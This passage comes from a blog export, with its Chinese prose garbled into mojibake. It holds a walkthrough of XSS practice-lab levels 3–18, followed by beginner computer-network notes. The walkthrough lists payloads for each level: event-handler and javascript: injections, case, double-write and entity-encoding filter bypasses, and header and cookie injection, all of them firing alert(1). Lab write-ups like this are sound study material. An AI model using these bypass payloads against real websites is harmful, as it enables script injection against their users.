<h2 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h2><p>è¿™å…³è¿›è¡Œäº†å®ä½“è½¬ä¹‰ï¼Œ<strong>ä¹Ÿå°±æ˜¯è¿‡æ»¤äº†&lt;&gt;å’Œâ€â€,</strong>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨å•å¼•å·å’Œæ³¨é‡Šç¬¦</p>
<p>å…¶ä¸­è½¬ä¹‰å‡½æ•°<img src="/2020/12/09/xss/image-20200821203827654.png" alt="image-20200821203827654"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39; onclick&#x3D;alert(1)&#x2F;&#x2F;</span><br><span class="line">&#39; onmouseover&#x3D;alert(1)&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
<h2 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h2><p>å’Œä¸Šä¸€å…³ä¸€æ ·ï¼Œä½†éœ€è¦æ³¨æ„çš„æ˜¯<strong>åŒå¼•å·</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot; onclick&#x3D;alert(1) &quot;</span><br><span class="line">&quot; onclick&#x3D;alert(1) &#x2F;&#x2F;</span><br><span class="line">&quot; onfocus&#x3D;alert(1) autofocus&#x3D;&quot;</span><br><span class="line">&quot; onfocus&#x3D;alert(1) &#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
<h2 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h2><p>è¿™ä¸ªå…³å¡è¿‡æ»¤äº†onï¼Œä½†æ²¡æœ‰è¿‡æ»¤å•åŒå¼•å·ï¼Œ<strong>æ‰€ä»¥å¯ä»¥ç”¨ä¼ªåè®®</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;&gt; &lt;a href&#x3D;&quot;javascript:alert(1)&quot;&gt;</span><br><span class="line">&quot;&gt; &lt;a href&#x3D;&quot;javascript:alert(1)&quot;&gt;111&lt;&#x2F;a&gt; &#x2F;&#x2F;</span><br><span class="line">&quot;&gt;&lt;iframe src&#x3D;javascript:alert(1)&gt;</span><br><span class="line">&quot;&gt;&lt;iframe src&#x3D;javascript:alert(1)&gt;</span><br></pre></td></tr></table></figure>
<h2 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h2><p>script è½¬æ¢æˆ scr_ipt        on è½¬æ¢æˆ o_n        src è½¬æ¢æˆ sr_c        data è½¬æ¢æˆ da_ta        href è½¬æ¢æˆ hr_ef</p>
<p><strong>ä½†å¯ä»¥å¤§å°å†™ç»•è¿‡</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;&gt;&lt;Script&gt;alert(1)&lt;&#x2F;script&gt;</span><br><span class="line">&quot;&gt; &lt;a Href&#x3D;&quot;javascript:alert(1)&quot;&gt;</span><br><span class="line">&quot; Onclick&#x3D;alert(1) &#x2F;&#x2F;</span><br><span class="line">&quot; Onclick&#x3D;alert(1) &quot;</span><br></pre></td></tr></table></figure>
<h2 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h2><p>è¿‡æ»¤äº†scriptï¼Œonï¼Œhref</p>
<p><strong>æ‰€ä»¥å¯ä»¥åŒå†™ç»•è¿‡</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;&gt;&lt;a hrhrefef&#x3D;&quot;javascriscriptpt:alert(1)&quot;&gt;111&lt;&#x2F;a&gt;&#x2F;&#x2F;</span><br><span class="line">&quot;&gt;&lt;scriscriptpt&gt;alert(1)&lt;&#x2F;scriscriptpt&gt;&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
<h2 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h2><p>script,onï¼Œsrcï¼Œdataï¼Œhrefï¼Œå¤§å°å†™å¤±æ•ˆï¼Œâ€è¢«ç¼–ç æ‰€ä»¥valueå¤„å‡ ä¹æ‰¾ä¸åˆ°</p>
<p>ä½†ä¸‹é¢é“¾æ¥å¤„å¯ä»¥çœ‹åˆ° &lt;&gt; â€˜ % # &amp; æœªè¢«è¿‡æ»¤ çœ‹äº†åˆ«äººé¢˜è§£ä¹‹åæ˜¯<strong>htmlå®ä½“ç¼–ç ç»•è¿‡</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">javasc&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:alert(1)</span><br><span class="line">javasc&amp;#114;&amp;#105;&amp;#112;&amp;#116;:alert(1)</span><br></pre></td></tr></table></figure>
<h2 id="level9"><a href="#level9" class="headerlink" title="level9"></a>level9</h2><p>ä¸äº†è§£ï¼Œå»çœ‹äº†æºç æ˜¯<strong>å¾—åŠ http://</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">javasc&amp;#114;&amp;#105;&amp;#112;&amp;#116;:alert(1)&#x2F;&#x2F;http:&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
<h2 id="level10"><a href="#level10" class="headerlink" title="level10"></a>level10</h2><p>è¿™çœŸæƒ³ä¸å‡ºæ¥</p>
<p>è¯•äº†ä¸‰ä¸ªå‚æ•°ï¼Œå‘ç°åªæœ‰æœ€åä¸€ä¸ªå¯ä»¥å†™å…¥ï¼Œ<strong>ç›´æ¥æ„é€ </strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot; type&#x3D;text onmouseover&#x3D;alert(1) &#x2F;&#x2F;</span><br><span class="line">&quot; type&#x3D;image src&#x3D;1 onerror&#x3D;alert(1)&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
<h2 id="level11"><a href="#level11" class="headerlink" title="level11"></a>level11</h2><p>è¿™ä¸ªé¢˜åº”è¯¥æ˜¯æŠ“åŒ…çœ‹ï¼Œä½†ç”±äºæˆ‘æ˜¯è°·æ­Œåšé¢˜ï¼Œç«ç‹æŠ“åŒ…ï¼Œå¯¼è‡´æ¯æ¬¡ç›´æ¥å¤åˆ¶11é¢˜urlå®ƒéƒ½ä¸ä¼šç›´æ¥æŠ“åˆ°refå¤´ï¼Œæ­£ç¡®åº”è¯¥æ˜¯åœ¨10é¢˜å‘11é¢˜è·³è½¬æ—¶æŠ“åŒ…ã€‚</p>
<p><img src="/2020/12/09/xss/image-20200822205648946.png" alt="image-20200822205648946"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot; onmouseover&#x3D;alert(1) type&#x3D;&#39;text&#39;&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
<p>æŠŠrefå¤´æ”¹æˆè¿™ä¸ªï¼Œå‘åŒ…å³å¯</p>
<h2 id="level12"><a href="#level12" class="headerlink" title="level12"></a>level12</h2><p>æœ‰äº†ä¸Šä¸€ä¸ªé¢˜çš„æç¤ºï¼Œè¿™ä¸ªé¢˜å°±æ˜æ˜¾å¾ˆå¤šäº†</p>
<p>åªè¦æ”¹ä¸€ä¸‹UAå¤´</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko&#x2F;20100101 Firefox&#x2F;79.0&quot; onmouseover&#x3D;alert(1) type&#x3D;&quot;text&quot; &#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
<h2 id="level13"><a href="#level13" class="headerlink" title="level13"></a>level13</h2><p>è¿™ä¸ªåº”è¯¥æ˜¯æ”¹cookie</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">__cfduid&#x3D;d0d48515569060ded9a058127e163bb661598095904;user&#x3D;&quot; onmouseover&#x3D;alert(1) type&#x3D;&quot;text&quot; &#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
<h2 id="level14"><a href="#level14" class="headerlink" title="level14"></a>level14</h2><p>é“¾æ¥å¥½åƒæ˜¯æŒ‚æ‰äº†ï¼Œä½†å¥½åƒæ˜¯æ²¡æœ‰å¤ªçœ‹æ‡‚ï¼Œå›å¤´å†æ¥çœ‹ä¸€ä¸‹</p>
<h2 id="level15"><a href="#level15" class="headerlink" title="level15"></a>level15</h2><p>çœ‹æºç å‘ç°</p>
<p><img src="/2020/12/09/xss/image-20200822213204305.png" alt="image-20200822213204305"></p>
<p>ç„¶åä¸Šç½‘æŸ¥ä¸€ä¸‹</p>
<p><strong>ng-include</strong> æŒ‡ä»¤ç”¨äºåŒ…å«å¤–éƒ¨çš„ HTML æ–‡ä»¶ã€‚</p>
<p>åŒ…å«çš„å†…å®¹å°†ä½œä¸ºæŒ‡å®šå…ƒç´ çš„å­èŠ‚ç‚¹ã€‚</p>
<p><code>ng-include</code> å±æ€§çš„å€¼å¯ä»¥æ˜¯ä¸€ä¸ªè¡¨è¾¾å¼ï¼Œè¿”å›ä¸€ä¸ªæ–‡ä»¶åã€‚</p>
<p>é»˜è®¤æƒ…å†µä¸‹ï¼ŒåŒ…å«çš„æ–‡ä»¶éœ€è¦åŒ…å«åœ¨<strong>åŒä¸€ä¸ªåŸŸå</strong>ä¸‹ã€‚</p>
<p>payloadï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?src&#x3D;&#39;level1.php?name&#x3D;test&lt;img src&#x3D;1 onerror&#x3D;alert(1)&gt;&#39;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;body&gt;&lt;span class&#x3D;&quot;ng-include:&#39;level1.php?name&#x3D;test&lt;img src&#x3D;1 onerror&#x3D;alert(1)&gt;&#39;&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;body&gt;</span><br></pre></td></tr></table></figure>
<p>ä¹Ÿå°±æ˜¯è¯´srcåŒ…å«çš„å†…å®¹ä¼šè¿›å…¥ng-includeè¢«åŒ…å«</p>
<p>é‚£æˆ‘ä»¬å¯ä»¥æƒ³å‡ºèƒ½ä¸èƒ½ç›´æ¥é—­åˆ</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?src&#x3D;&quot;&gt;&lt;img src&#x3D;1 onerror&#x3D;alert(1)&gt;</span><br></pre></td></tr></table></figure>
<p>ä½†å‘ç°ç›´æ¥è¢«è½¬ä¹‰äº†ï¼Œæ‰€ä»¥è¿˜æ˜¯ä¸è¡Œï¼Œåªèƒ½åŒ…å«ç¬¬ä¸€å…³ä»£ç </p>
<h2 id="level16"><a href="#level16" class="headerlink" title="level16"></a>level16</h2><p>è¿™ä¸ªé¢˜æ˜¯æŠŠç©ºæ ¼è¿‡æ»¤äº†</p>
<p>ç”¨%0då’Œ%0aç»•è¿‡</p>
<p><strong>%0aæ¢è¡Œç¬¦å·â€\nâ€<br>%0då›è½¦ç¬¦å·â€\râ€</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;img%0Dsrc&#x3D;1%0Donerror&#x3D;alert(1)&gt;</span><br><span class="line">&lt;img%0asrc&#x3D;1%0aonerror&#x3D;alert(1)&gt;</span><br></pre></td></tr></table></figure>
<h2 id="level17"><a href="#level17" class="headerlink" title="level17"></a>level17</h2><p>å°±æ‰¾æºç å’Œurlä¹‹é—´çš„å…³ç³»</p>
<p>å¯ä»¥çœ‹è§åœ¨srcå¤„æœ‰ä¸åŒ</p>
<p>&lt;&gt;è¢«è¿‡æ»¤ï¼Œè€ƒè™‘onäº‹ä»¶</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?arg02&#x3D; onmouseover&#x3D;alert(1)</span><br></pre></td></tr></table></figure>
<h2 id="level18"><a href="#level18" class="headerlink" title="level18"></a>level18</h2><p>å’Œ17å…³ä¸€æ ·</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?arg01&#x3D;a%20&amp;arg02&#x3D;b onmouseover&#x3D;alert(1)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">- åå¼•å·ä»£æ›¿åœ†æ‹¬å·</span><br><span class="line">- æ¢è¡Œç»•è¿‡æ­£åˆ™</span><br><span class="line">- &lt;!--ä¸ä»…å¯ä»¥ç”¨--&gt;,ä¹Ÿå¯ä»¥ç”¨--!&gt;é—­åˆ</span><br><span class="line">- &#x2F;&#x2F;å¯ä»¥ç”¨æ¢è¡Œæ¥ç»•è¿‡</span><br><span class="line">- &lt;!--å’Œ--&gt;éƒ½å¯ä»¥åœ¨htmlçš„scriptæ ‡ç­¾é‡Œå•ç‹¬ä½¿ç”¨è¿›è¡Œå•è¡Œæ³¨é‡Š</span><br><span class="line">- Å¿ ç¬¦å·è½¬æ¢ä¸ºå¤§å†™åæ­£å¥½ä¸ºå¤§å†™å­—æ¯ S</span><br><span class="line">- å¯ä»¥ç”¨ %0a ä»£æ›¿ç©ºæ ¼è¿›è¡Œç»•è¿‡</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>xss</tag>
      </tags>
  </entry>
  <entry>
    <title>è®¡ç½‘</title>
    <url>/2020/12/09/%E8%AE%A1%E7%BD%91/</url>
    <content><![CDATA[<p>è¿™ä¸ªåªæœ‰è¿™ä¸€éƒ¨åˆ†äº†</p>
<p>åé¢å­¦äº†ä½†å¥½åƒä¸¢äº†</p>
<p>çœ‹å¤šä¼šå­¦åˆ°è®¡ç½‘æ—¶ï¼Œå†æ¥è¡¥è¿™ä¸€ç¯‡</p>
<h1 id="è®¡ç½‘åˆå­¦"><a href="#è®¡ç½‘åˆå­¦" class="headerlink" title="è®¡ç½‘åˆå­¦"></a>è®¡ç½‘åˆå­¦</h1><h2 id="TCP-IPåˆ†å±‚æ¨¡å‹"><a href="#TCP-IPåˆ†å±‚æ¨¡å‹" class="headerlink" title="TCP/IPåˆ†å±‚æ¨¡å‹"></a><strong>TCP/IPåˆ†å±‚æ¨¡å‹</strong></h2><div class="table-container">
<table>
<thead>
<tr>
<th>åº”ç”¨å±‚ï¼ˆç¬¬äº”å±‚)</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>ä¼ è¾“å±‚ï¼ˆç¬¬å››å±‚ï¼‰</strong></td>
</tr>
<tr>
<td><strong>äº’è”ç½‘å±‚ï¼ˆç¬¬ä¸‰å±‚ï¼‰</strong></td>
</tr>
<tr>
<td><strong>ç½‘è·¯æ¥å£å±‚ï¼ˆç¬¬äºŒå±‚ï¼‰</strong></td>
</tr>
<tr>
<td><strong>ç‰©ç†å±‚ï¼ˆç¬¬ä¸€å±‚ï¼‰</strong></td>
</tr>
</tbody>
</table>
</div>
<p>ç‰©ç†å±‚ï¼šå¯¹åº”äºç½‘ç»œçš„åŸºæœ¬ç¡¬ä»¶ï¼Œå³æˆ‘ä»¬å¯ä»¥çœ‹å¾—è§çš„ç¡¬ä»¶è®¾å¤‡ã€‚</p>
<p>ç½‘ç»œæ¥å£å±‚ï¼šå®šä¹‰äº†å°†æ•°æ®ç»„æˆæ­£ç¡®å¸§çš„è§„ç¨‹å’Œåœ¨ç½‘ç»œä¸­ä¼ è¾“å¸§çš„è§„ç¨‹ã€‚</p>
<p>äº’è”ç½‘å±‚ï¼šæœ¬å±‚å®šä¹‰äº†äº’è”ç½‘ä¸­ä¼ è¾“çš„ä¿¡æ¯åŒ…çš„æ ¼å¼ï¼Œä»¥åŠä»ä¸€ä¸ªç”¨æˆ·é€šè¿‡ä¸€ä¸ªæˆ–å¤šä¸ªè·¯ç”±å™¨åˆ°æœ€ç»ˆç›®æ ‡çš„ä¿¡æ¯åŒ…è½¬å‘æœºåˆ¶ã€‚</p>
<p>ä¼ è¾“å±‚ï¼šä¸ºä¸¤ä¸ªç”¨æˆ·è¿›ç¨‹ä¹‹é—´å»ºç«‹ï¼Œç®¡ç†å’Œæ‹†é™¤å¯é è€Œåˆæœ‰æ•ˆçš„ç«¯åˆ°ç«¯çš„è¿æ¥ã€‚</p>
<p>åº”ç”¨å±‚ï¼šå®šä¹‰äº†åº”ç”¨ç¨‹åºä½¿ç”¨äº’è”ç½‘çš„è§„ç¨‹ã€‚</p>
<h2 id="IPåœ°å€"><a href="#IPåœ°å€" class="headerlink" title="IPåœ°å€"></a>IPåœ°å€</h2><p>ipåœ°å€åˆ†ä¸ºä¸¤éƒ¨åˆ†ï¼šç½‘ç»œæ ‡è¯†å’Œä¸»æœºæ ‡è¯†</p>
<p>ç½‘ç»œæ ‡è¯†ï¼šç”¨ä»¥æ ‡æ˜å…·ä½“çš„ç½‘ç»œæ®µ</p>
<p>ä¸»æœºæ ‡è¯†ï¼šæŸä¸ªç½‘ç»œä¸­å¾…å®šçš„è®¡ç®—æœºå·ç </p>
<p>ç½‘ç»œæ ‡è¯†ï¼š210.73.140.0</p>
<p>ä¸»æœºæ ‡è¯†ï¼š                    2</p>
<p>åˆèµ·æ¥å†™ï¼š210.73.140.2</p>
<p>äººä»¬æŒ‰ç…§ç½‘ç»œè§„æ¨¡çš„å¤§å°ï¼ŒæŠŠ32ä¸ºåœ°å€ä¿¡æ¯è®¾æˆ3ç§å®šä½çš„åˆ’åˆ†æ–¹å¼ï¼Œä¸‰ç§åˆ’åˆ†æ–¹æ³•åˆ†åˆ«å¯¹åº”äºAï¼ŒBï¼ŒCç±»IPåœ°å€ï¼ŒIPåœ°å€åˆ†ä¸ºç½‘ç»œå·å’Œä¸»æœºå·ä¸¤éƒ¨åˆ†</p>
<p>ï¼ˆ1ï¼‰Aç±»IPåœ°å€ï¼ˆ1-126ï¼‰</p>
<p>è¯¥åœ°å€ç”±1å­—èŠ‚ç½‘ç»œåœ°å€å’Œ3å­—èŠ‚ä¸»æœºåœ°å€ç»„æˆï¼Œç½‘ç»œåœ°å€æœ€é«˜ä½å¿…é¡»æ˜¯0ã€‚</p>
<p>ï¼ˆ2ï¼‰Bç±»IPåœ°å€ï¼ˆ128-191ï¼‰</p>
<p>è¯¥åœ°å€ç”±2å­—èŠ‚ç½‘ç»œåœ°å€å’Œ2å­—èŠ‚ä¸»æœºåœ°å€ç»„æˆï¼Œç½‘ç»œåœ°å€æœ€é«˜ä½å¿…é¡»æ˜¯10ã€‚</p>
<p>ï¼ˆ3ï¼‰Cç±»IPåœ°å€ï¼ˆ192-223ï¼‰</p>
<p>è¯¥åœ°å€ç”±3å­—èŠ‚ç½‘ç»œåœ°å€å’Œ1å­—èŠ‚ä¸»æœºåœ°å€ç»„æˆï¼Œç½‘ç»œåœ°å€æœ€é«˜ä½å¿…é¡»æ˜¯110ã€‚</p>
<p>ï¼ˆ4ï¼‰Dç±»IPåœ°å€ï¼ˆ224-239ï¼‰</p>
<p>å¤šç‚¹å¹¿æ’­åœ°å€ï¼Œç”¨äºIPç»„æ’­ã€‚</p>
<p>ï¼ˆ5ï¼‰Eç±»IPåœ°å€ï¼ˆ240-225ï¼‰</p>
<p>ä¿ç•™åœ°å€ï¼Œç”¨ä½œç‰¹æ®Šç”¨é€”ã€‚</p>
<p>ï¼ˆ0.0.0.0ï¼‰å¯¹åº”å½“å‰ä¸»æœºï¼Œï¼ˆ255.255.255.255ï¼‰æ˜¯å½“å‰å­ç½‘çš„ä¼ æ’­åœ°å€ã€‚</p>
<h2 id="åŸŸå"><a href="#åŸŸå" class="headerlink" title="åŸŸå"></a>åŸŸå</h2><p>é¡¶çº§åŸŸå .com</p>
<p>äºŒçº§åŸŸå test.com</p>
<p>ä¸‰çº§åŸŸå test.cn.com</p>
<p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200609213455144.png" alt="image-20200609213455144"></p>
<p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200609214339970.png" alt="image-20200609214339970"></p>
<h2 id="DNSæœåŠ¡å™¨"><a href="#DNSæœåŠ¡å™¨" class="headerlink" title="DNSæœåŠ¡å™¨"></a>DNSæœåŠ¡å™¨</h2><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200609214938548.png" alt="image-20200609214938548"></p>
<h1 id="è®¡ç½‘å­¦ä¹ "><a href="#è®¡ç½‘å­¦ä¹ " class="headerlink" title="è®¡ç½‘å­¦ä¹ "></a>è®¡ç½‘å­¦ä¹ </h1><h2 id="ç¬¬ä¸€ç« -è®¡ç®—æœºç½‘ç»œæ¦‚è¿°"><a href="#ç¬¬ä¸€ç« -è®¡ç®—æœºç½‘ç»œæ¦‚è¿°" class="headerlink" title="ç¬¬ä¸€ç«  è®¡ç®—æœºç½‘ç»œæ¦‚è¿°"></a>ç¬¬ä¸€ç«  è®¡ç®—æœºç½‘ç»œæ¦‚è¿°</h2><p>å±€åŸŸç½‘ï¼šè¦†ç›–èŒƒå›´å°  è‡ªå·±èŠ±é’±ä¹°è®¾å¤‡  å¸¦å®½å›ºå®š</p>
<p>å¹¿åŸŸç½‘ï¼šè·ç¦»è¿œ èŠ±é’±ä¹°æœåŠ¡</p>
<p>Internet ï¼šæœ‰è‡ªå·±çš„æœºæˆ¿  å¯¹ç½‘æ°‘æä¾›è¿æ¥ã€‚</p>
<p>IPåœ°å€ï¼šç½‘ç»œä¸­çš„åœ°å€ã€‚</p>
<p>ç‰©ç†åœ°å€ï¼šMacåœ°å€ï¼Œç”µè„‘å‡ºå‚æ—¶å·²å›ºå®šã€‚</p>
<p>ç½‘å…³ï¼šä¸‹å›¾ä¸­çš„Gå°±æ˜¯ç½‘å…³ï¼Œç›¸å½“äºç½‘ç»œä¸­çš„ä¸€ä¸ªå…³å¡ã€‚ç½‘å…³åœ°å€ä¸ºGçš„IPåœ°å€ã€‚</p>
<p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200609224145835.png" alt="image-20200609224145835"></p>
<div class="table-container">
<table>
<thead>
<tr>
<th>æœ¬æœºip</th>
<th>è®¿é—®ip</th>
<th>æœ¬æœºmac</th>
<th>ä¸‹æ¬¡è®¿é—®mac</th>
</tr>
</thead>
<tbody>
<tr>
<td>15.0.0.2</td>
<td>13.0.0.2</td>
<td>m4</td>
<td>m5</td>
</tr>
</tbody>
</table>
</div>
<p><strong>OSIå‚è€ƒæ¨¡å‹</strong></p>
<ul>
<li>åº”ç”¨å±‚ï¼šèƒ½äº§ç”Ÿç½‘ç»œæµé‡çš„ç¨‹åº</li>
<li>è¡¨ç¤ºå±‚ï¼šåœ¨ä¼ è¾“ä¹‹å‰æ˜¯å¦åŠ å¯†æˆ–å‹ç¼©å¤„ç†</li>
<li>ä¼šè¯å±‚ï¼šæŸ¥æ­£åœ¨è¿›è¡Œä¼šè¯çš„ç¨‹åº netstat -nb</li>
<li>ä¼ è¾“å±‚ï¼šå¯é ä¼ è¾“ï¼ˆTCPï¼‰å’Œæµé‡æ§åˆ¶ ä¸å¯é ä¼ è¾“ï¼ˆUDPï¼‰</li>
<li>ç½‘ç»œå±‚ï¼šé€‰æ‹©æœ€ä½³è·¯å¾„ è§„åˆ’IPåœ°å€</li>
<li>æ•°æ®é“¾è·¯å±‚ï¼šå¸§çš„å¼€å§‹å’Œç»“æŸã€‚å·®é”™æ£€æŸ¥ã€‚</li>
<li>ç‰©ç†å±‚ï¼šæ¥å£æ ‡å‡†å’Œç”µå™¨æ ‡å‡†</li>
</ul>
<p><strong>OSIå‚è€ƒæ¨¡å‹ç½‘ç»œæ’é”™æŒ‡å¯¼</strong></p>
<ol>
<li>ç‰©ç†å±‚æ•…éšœï¼šæŸ¥çœ‹è¿æ¥çŠ¶æ€ï¼Œå‘é€å’Œæ¥å—çš„æ•°æ®åŒ…</li>
<li>æ•°æ®é“¾è·¯å±‚ï¼šMACåœ°å€å†²çªã€ç½‘é€Ÿåå•†ä¸ä¸€è‡´ã€è®¡ç®—æœºVLANé”™è¯¯</li>
<li>ç½‘ç»œå±‚æ•…éšœï¼šé…ç½®é”™è¯¯çš„IPåœ°å€ å­ç½‘æ©ç å’Œé”™è¯¯çš„ç½‘å…³</li>
<li>åº”ç”¨å±‚æ•…éšœï¼šåº”ç”¨é”™è¯¯ä»£ç†ã€‚</li>
</ol>
<p>æ£€æŸ¥ç½‘ç»œæ˜¯å¦é€šç•…ï¼špingä¸€ä¸ªç½‘å€</p>
<p><strong>OSIå‚è€ƒæ¨¡å‹å’Œç½‘ç»œå®‰å…¨</strong></p>
<ol>
<li>ç‰©ç†å±‚å®‰å…¨</li>
<li>æ•°æ®é“¾è·¯å±‚å®‰å…¨ï¼šç™»å½•éœ€è¦è´¦å·å’Œå¯†ç </li>
<li>ç½‘ç»œå±‚å®‰å…¨ï¼šè·¯ç”±å™¨é™åˆ¶æ•°æ®åŒ…æµé‡</li>
<li>åº”ç”¨å±‚å®‰å…¨ï¼šå¼€å‘ç¨‹åºæœ‰æ²¡æœ‰æ¼æ´<img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200610122326325.png" alt="image-20200610122326325"></li>
</ol>
<p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200610122957433.png" alt="image-20200610122957433"></p>
<h2 id="ç¬¬äºŒç« -ç‰©ç†å±‚"><a href="#ç¬¬äºŒç« -ç‰©ç†å±‚" class="headerlink" title="ç¬¬äºŒç«  ç‰©ç†å±‚"></a>ç¬¬äºŒç«  ç‰©ç†å±‚</h2><h3 id="0x01ç‰©ç†å±‚çš„åŸºæœ¬æ¦‚å¿µ"><a href="#0x01ç‰©ç†å±‚çš„åŸºæœ¬æ¦‚å¿µ" class="headerlink" title="0x01ç‰©ç†å±‚çš„åŸºæœ¬æ¦‚å¿µ"></a>0x01ç‰©ç†å±‚çš„åŸºæœ¬æ¦‚å¿µ</h3><p>ç‰©ç†å±‚è§£å†³å¦‚ä½•è¿æ¥åœ¨å„ç§è®¡ç®—æœºçš„<strong>ä¼ è¾“åª’ä½“ä¸Š</strong>ä¼ è¾“<strong>æ•°æ®æ¯”ç‰¹æµ</strong>ï¼Œä¸æ˜¯æŒ‡å…·ä½“çš„ä¼ è¾“åª’ä½“ã€‚</p>
<p>ç‰©ç†å±‚ä¸»è¦æ˜¯ç¡®å®šä¼ è¾“åª’ä½“çš„æ¥å£çš„ä¸€äº›ç‰¹æ€§ã€‚æœ‰æœºæ¢°ï¼Œç”µå™¨ï¼ŒåŠŸèƒ½ï¼Œè¿‡ç¨‹ç‰¹æ€§ã€‚</p>
<h3 id="0x02æ•°æ®é€šä¿¡çŸ¥è¯†"><a href="#0x02æ•°æ®é€šä¿¡çŸ¥è¯†" class="headerlink" title="0x02æ•°æ®é€šä¿¡çŸ¥è¯†"></a>0x02æ•°æ®é€šä¿¡çŸ¥è¯†</h3><p><strong>æ•°æ®é€šä¿¡æ¨¡å‹</strong>ï¼š</p>
<p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200611101252348.png" alt="image-20200611101252348"></p>
<p>æ•°æ®ï¼šè¿é€æ¶ˆæ¯çš„å®ä½“ã€‚</p>
<p>ä¿¡å·ï¼šæ•°æ®ç”µæ°”æˆ–ç”µç£çš„è¡¨ç°ã€‚</p>
<p>ä¿¡é“ï¼šè¡¨ç¤ºä¸€ä¸ªæ–¹å‘ä¼ é€ä¿¡æ¯çš„åª’ä½“ã€‚</p>
<p>å•å‘é€šä¿¡ï¼ŒåŒå‘äº¤æ›¿é€šä¿¡ï¼ŒåŒå‘åŒæ—¶é€šä¿¡ã€‚</p>
<p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200611103259080.png" alt="image-20200611103259080"></p>
<h3 id="0x03ç‰©ç†å±‚ä¸‹é¢çš„ä¼ è¾“åª’ä½“"><a href="#0x03ç‰©ç†å±‚ä¸‹é¢çš„ä¼ è¾“åª’ä½“" class="headerlink" title="0x03ç‰©ç†å±‚ä¸‹é¢çš„ä¼ è¾“åª’ä½“"></a>0x03ç‰©ç†å±‚ä¸‹é¢çš„ä¼ è¾“åª’ä½“</h3><p>æ— å±è”½åŒç»çº¿UTP</p>
<p>å±è”½åŒç»çº¿STP</p>
<p>åŒè½´ç”µç¼†</p>
<p>å…‰çº¤</p>
<p>å¾®æ³¢ä¼ è¾“</p>
<p>ç‰©ç†å±‚è®¾å¤‡â€”é›†çº¿å™¨</p>
<h3 id="0x04ä¿¡é“å¤ç”¨æŠ€æœ¯"><a href="#0x04ä¿¡é“å¤ç”¨æŠ€æœ¯" class="headerlink" title="0x04ä¿¡é“å¤ç”¨æŠ€æœ¯"></a>0x04ä¿¡é“å¤ç”¨æŠ€æœ¯</h3><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200611121924344.png" alt="image-20200611121924344"></p>
<h3 id="0x05æ•°å­—ä¼ è¾“ç³»ç»Ÿ"><a href="#0x05æ•°å­—ä¼ è¾“ç³»ç»Ÿ" class="headerlink" title="0x05æ•°å­—ä¼ è¾“ç³»ç»Ÿ"></a>0x05æ•°å­—ä¼ è¾“ç³»ç»Ÿ</h3><h3 id="0x06å®½å¸¦æ¥å…¥æŠ€æœ¯"><a href="#0x06å®½å¸¦æ¥å…¥æŠ€æœ¯" class="headerlink" title="0x06å®½å¸¦æ¥å…¥æŠ€æœ¯"></a>0x06å®½å¸¦æ¥å…¥æŠ€æœ¯</h3><p>ADSL</p>
<p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200611122852820.png" alt="image-20200611122852820"></p>
<p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200611123214486.png" alt="image-20200611123214486"></p>
<p>å…‰çº¤</p>
<p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200611123435591.png" alt="image-20200611123435591"></p>
<p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200611123546821.png" alt="image-20200611123546821"></p>
